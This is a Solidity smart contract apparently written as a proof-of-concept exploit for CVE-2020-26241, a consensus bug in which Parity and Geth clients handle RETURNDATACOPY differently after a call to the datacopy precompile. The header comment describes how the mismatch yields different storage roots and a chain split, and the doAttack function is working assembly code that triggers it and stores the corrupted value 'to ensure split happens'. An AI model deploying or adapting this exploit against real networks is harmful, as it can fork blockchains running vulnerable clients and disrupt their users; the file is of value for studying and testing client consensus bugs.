// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

/**
    writes X to an EVM memory region R,
    calls 0x00..04 (Precompiled DATACOPY contract) with R as an argument,
    overwrites R to Y, and finally invokes the RETURNDATACOPY opcode.
    When this contract is invoked, Parity would push X on the EVM stack, whereas Geth would push Y.
    Since the stack and memory is volatile, execute SSTORE to add the corrupted value to storage.
    This will end up yielded an invalid storage root hash and finally an invalid merkle root hash,
    causing the chain split.
**/
contract CVE_2020_26241 {
    function doAttack(bytes memory data) public returns (bytes memory) {
        //data is X and its location is the evm memory region R
        bytes memory ret = new bytes(data.length);
        bytes memory Y = "vghbghnjksvdvewfrgthyjukjyukyjtdfsfdrgthyhdngm"; //  allocate Y

        assembly {
            //returns size of bytes to use
            let len := mload(data)

            //call copy with region R as argument
            if iszero(call(gas(), 0x04, 0, add(data, 0x20), len, add(data,0x20), len)) {
                invalid()
            }

            //The first 0x20 (32 bytes) represent length of the data Y,
            //add it to the offset to get actual data
            let _Y := mload(add(Y, 0x20))

            // overwrite region R with Y
            mstore(add(data, 0x20), _Y)

            //invoke returndatacopy opcode
            let myLen := returndatasize()
            returndatacopy(add(data, 0x20), 0, myLen)
            let _final := mload(add(data, 0x20))

            //ensures split happens
            sstore("hello", _final)
        }
        return ret;
    }
}
